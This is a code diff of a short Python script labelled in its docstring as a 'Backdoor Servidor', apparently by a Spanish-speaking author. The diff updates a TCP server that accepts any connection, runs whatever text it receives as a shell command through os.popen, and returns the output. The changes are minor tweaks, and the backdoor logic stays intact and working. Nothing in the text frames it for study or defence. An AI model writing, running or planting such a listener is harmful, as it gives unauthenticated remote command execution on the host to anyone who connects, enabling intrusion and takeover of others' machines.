@@ -1,7 +1,7 @@
 """
 Uso: Backdoor Servidor
 Creado: Andrés Hernández Mata
-Version: 1.1.0
+Version: 1.1.1
 Python: 3.9.1
 Fecha: 08 Abril 2020
 """
@@ -17,22 +17,22 @@ bufferSize = 1024
 
 TCPServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 TCPServerSocket.bind(servidor)
-TCPServerSocket.listen()
+TCPServerSocket.listen(5)  
 
 print("[+] Iniciado Servidor...")
 
-while(True):     
-    cliente, direccion = TCPServerSocket.accept()
-    comando = cliente.recv(bufferSize)   
+while True:    
+    cliente, direccion = TCPServerSocket.accept()        
+    print("[-] Direccion ", direccion)
+    comando = cliente.recv(bufferSize)
     print("[+] Recibiendo Comando...") 
     comando = comando.decode()
-    stream = os.popen(comando)
+    salida = os.popen(comando)
     print("[+] Ejecutando...")  
-    salida = stream.read()
+    salida = salida.read()
     print("[+] Enviando Resultado...")
     salida = salida.encode()
-    cliente.send(salida)
+    cliente.send(salida)    
     print("\n")
     print("[+] Esperando...")
-    
 
